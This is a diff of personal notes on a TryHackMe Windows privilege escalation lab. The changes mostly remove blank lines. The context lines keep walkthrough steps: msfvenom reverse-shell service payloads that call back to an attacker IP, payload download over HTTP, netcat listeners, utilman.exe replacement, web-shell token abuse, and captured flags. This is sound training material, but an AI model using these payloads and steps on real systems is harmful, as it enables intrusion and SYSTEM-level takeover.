@@ -28,7 +28,6 @@ Gaining access to different accounts can be as simple as finding credentials in 
 
 Before jumping into the actual techniques, let's look at the different account types on a Windows system.
 
-
 Windows Users
 
 Windows systems mainly have two kinds of users. Depending on their access levels, we can categorise a user in one of the following groups:
@@ -46,7 +45,6 @@ Network Service
 	Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network.
 
 These accounts are created and managed by Windows, and you won't be able to use them as other regular accounts. Still, in some situations, you may gain their privileges due to exploiting specific services.
-
 
 Users that can change system configurations are part of which group?
 *Administrators*
@@ -175,7 +173,6 @@ Retrieve the saved password stored in the saved PuTTY session under your profile
 
 Privilege escalation is not always a challenge. Some misconfigurations can allow you to obtain higher privileged user access and, in some cases, even administrator access. It would help if you considered these to belong more to the realm of CTF events rather than scenarios you will encounter during real penetration testing engagements. However, if none of the previously mentioned methods works, you can always go back to these.
 
-
 Scheduled Tasks
 
 Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.
@@ -237,7 +234,6 @@ wprivesc1\taskusr1
 ```
 
 Go to taskusr1 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.
-
 
 AlwaysInstallElevated
 
@@ -468,7 +464,6 @@ All of the services configurations are stored on the registry under `HKLM\SYSTEM
 
 A subkey exists for every service in the system. Again, we can see the associated executable on the ImagePath value and the account used to start the service on the ObjectName value. If a DACL has been configured for the service, it will be stored in a subkey called Security. As you have guessed by now, only administrators can modify such registry entries by default.
 
-
 Insecure Permissions on Service Executable
 
 If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.
@@ -576,7 +571,6 @@ wprivesc1\svcusr1
 
 Go to svcusr1 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.
 
-
 Unquoted Service Paths
 
 When we can't directly write into service executables as before, there might still be a chance to force a service into running arbitrary executables by using a rather obscure feature.
@@ -640,7 +634,6 @@ Instead of failing as it probably should, SCM tries to help the user and starts 
     First, search for C:\\MyPrograms\\Disk.exe. If it exists, the service will run this executable.
     If the latter doesn't exist, it will then search for C:\\MyPrograms\\Disk Sorter.exe. If it exists, the service will run this executable.
     If the latter doesn't exist, it will then search for C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe. This option is expected to succeed and will typically be run in a default installation.
-
 
 From this behaviour, the problem becomes evident. If an attacker creates any of the executables that are searched for before the expected service executable, they can force the service to run an arbitrary executable.
 
@@ -713,7 +706,6 @@ wprivesc1\svcusr2
 
 Go to svcusr2 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.
 
-
 Insecure Service Permissions
 
 You might still have a slight chance of taking advantage of a service if the service's executable DACL is well configured, and the service's binary path is rightly quoted. Should the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.
@@ -780,7 +772,6 @@ Microsoft Windows [Version 10.0.17763.1821]
 
 C:\Windows\system32>whoami
 NT AUTHORITY\SYSTEM
-
 
 ```
 
@@ -852,7 +843,6 @@ C:\Users\thm-unpriv>dir
 05/03/2022  03:14 PM    <DIR>          Videos
                1 File(s)         48,640 bytes
               14 Dir(s)  15,004,889,088 bytes free
-
 
 kali
 ┌──(kali㉿kali)-[~/Downloads/Windows_priv]
@@ -1020,7 +1010,6 @@ THM{AT_YOUR_SERVICE}
 Get the flag on svcusr1's desktop.
 *THM{AT_YOUR_SERVICE}*
 
-
 ```
 C:\Users\thm-unpriv>sc qc "disk sorter enterprise"
 [SC] QueryServiceConfig SUCCESS
@@ -1046,7 +1035,6 @@ c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
 
 Successfully processed 1 files; Failed processing 0 files
 
-
 ┌──(kali㉿kali)-[~/Downloads/Windows_priv]
 └─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.81.220 LPORT=4446 -f exe-service -o rev-svc2.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -1060,7 +1048,6 @@ Saved as: rev-svc2.exe
 └─$ python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.10.90.7 - - [01/Sep/2022 13:24:54] "GET /rev-svc2.exe HTTP/1.1" 200 -
-
 
 PS C:\Users\thm-unpriv> wget http://10.11.81.220:8000/rev-svc2.exe -O rev-svc2.exe
 
@@ -1108,7 +1095,6 @@ C:\MyPrograms>dir
                1 File(s)         48,640 bytes
                4 Dir(s)  15,002,382,336 bytes free
 
-
 ┌──(kali㉿kali)-[~]
 └─$ nc -nlvp 4446
 listening on [any] 4446 ...
@@ -1129,7 +1115,6 @@ THM{QUOTES_EVERYWHERE}
 Get the flag on svcusr2's desktop.
 
 *THM{QUOTES_EVERYWHERE}*
-
 
 ```
 C:\Users\thm-unpriv>cd C:\tools\AccessChk
@@ -1177,7 +1162,6 @@ thmservice
 
 C:\tools\AccessChk>
 
-
 ┌──(kali㉿kali)-[~/Downloads/Windows_priv]
 └─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.81.220 LPORT=4447 -f exe-service -o rev-svc3.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -1191,7 +1175,6 @@ Saved as: rev-svc3.exe
 └─$ python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.10.90.7 - - [01/Sep/2022 13:34:57] "GET /rev-svc3.exe HTTP/1.1" 200 -
-
 
 PS C:\Users\thm-unpriv> wget http://10.11.81.220:8000/rev-svc3.exe -O rev-svc3.exe
 
@@ -1209,7 +1192,6 @@ C:\Users\thm-unpriv>sc stop THMService
 [SC] ControlService FAILED 1062:
 
 The service has not been started.
-
 
 C:\Users\thm-unpriv>sc start THMService
 
@@ -1394,7 +1376,6 @@ We'll abuse `utilman.exe` to escalate privileges this time. Utilman is a built-i
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a5437a609e41d982b320967667e9b97a.png)
 
-
 Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file, replacing it is trivial.
 
 To replace utilman, we will start by taking ownership of it with the following command:
@@ -1435,7 +1416,6 @@ And finally, proceed to click on the "Ease of Access" button, which runs utilman
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1401bc3dcb1e4eb84f526b95567a5ef8.png)
 
-
 SeImpersonate / SeAssignPrimaryToken
 
 These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.
@@ -1467,7 +1447,6 @@ Let's start by assuming we have already compromised a website running on IIS and
 http://10.10.12.124/
 
 We can use the web shell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest for this task:
-
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/4603506a36f4bbda602dc67cdc845d9f.png)
 
@@ -1593,7 +1572,6 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] Closing down connection (10.10.12.124,49769)
 [*] Remaining connections []
 
-
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ cd share               
                                                                           
@@ -1655,8 +1633,6 @@ Cannot access file C:\Users\Administrator\flag.txt
 C:\Windows\system32> more C:\Users\Administrator\Desktop\flag.txt
 THM{SEFLAGPRIVILEGE}
 
-
-
 ```
 
 Get the flag on the Administrator's desktop.
@@ -1690,8 +1666,6 @@ Overwrite utilman.exe? (Yes/No/All): Yes
         1 file(s) copied.
 ```
 
-![[Pasted image 20220902112423.png]]
-
 ``` the 3 ways learned
 ┌──(kali㉿kali)-[~]
 └─$ nc -nlvp 4442
@@ -1713,11 +1687,7 @@ C:\Windows\system32>more C:\Users\Administrator\Desktop\flag.txt
 more C:\Users\Administrator\Desktop\flag.txt
 THM{SEFLAGPRIVILEGE}
 
-
 ```
-
-![[Pasted image 20220902113114.png]]
-
 
 ### Abusing vulnerable software 
 
@@ -1865,7 +1835,6 @@ VMware Workstation                                                              
        16.1.0
 SQL Server 2019 Shared Management Objects                                                          Microsoft Corporation       15.0.2000.5
 
-
 UE4 Prerequisites (x64)                                                                            Epic Games, Inc.            1.2.0.0
 SQL Server 2019 Common Files                                                                       Microsoft Corporation       15.0.2000.5
 Microsoft .NET Targeting Pack - 6.0.1 (x64)                                                        Microsoft Corporation       48.7.32725
@@ -1957,11 +1926,7 @@ A patch was issued, where they decided to check that the executed command starte
 
 To put together a working exploit, we need to understand how to talk to port 6064. Luckily for us, the protocol in use is straightforward, and the packets to be sent are depicted in the following diagram:
 
-
-
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/ff706d6530426d3123c0983acd61f934.png)
-
-
 
 The first packet is simply a hello packet that contains a fixed string. The second packet indicates that we want to execute procedure number 5, as this is the vulnerable procedure that will execute any command for us. The last two packets are used to send the length of the command and the command string to be executed, respectively.
 
@@ -2056,7 +2021,6 @@ Druva inSync 6.6.3                                              Druva Technologi
 AWS PV Drivers                                                  Amazon Web Services                      8.3.4
 Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29910  Microsoft Corporation                    14.28.29910
 
-
 powershell
 
 Windows PowerShell
@@ -2119,8 +2083,6 @@ The command completed successfully.
 
 ```
 
-![[Pasted image 20220902121217.png]]
-
 Get the flag on the Administrator's desktop.
 *THM{EZ_DLL_PROXY_4ME} *
 
@@ -2129,7 +2091,6 @@ Get the flag on the Administrator's desktop.
 Several scripts exist to conduct system enumeration in ways similar to the ones seen in the previous task. These tools can shorten the enumeration process time and uncover different potential privilege escalation vectors. However, please remember that automated tools can sometimes miss privilege escalation.
 
 Below are a few tools commonly used to identify privilege escalation vectors. Feel free to run them against any of the machines in this room and see if the results match the discussed attack vectors.
-
 
 WinPEAS
 
@@ -2173,17 +2134,14 @@ Kali Linux
 user@kali$ wes.py systeminfo.txt
 ```        
 
-
 Metasploit
 
 If you already have a Meterpreter shell on the target system, you can use the `multi/recon/local_exploit_suggester` module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.
-
 
 Click and continue learning!
 *No answer needed*
 
 ### Conclusion 
-
 
 In this room, we have introduced several privilege escalation techniques available in Windows systems. These techniques should provide you with a solid background on the most common paths attackers can take to elevate privileges on a system. Should you be interested in learning about additional techniques, the following resources are available:
 
@@ -2195,32 +2153,10 @@ In this room, we have introduced several privilege escalation techniques availab
     Token Kidnapping (https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
     Hacktricks - Windows Local Privilege Escalation (https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
 
-
-
 Click and continue learning!
 *No answer needed*
 
 [[Vulnerability Capstone]]
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
    
 
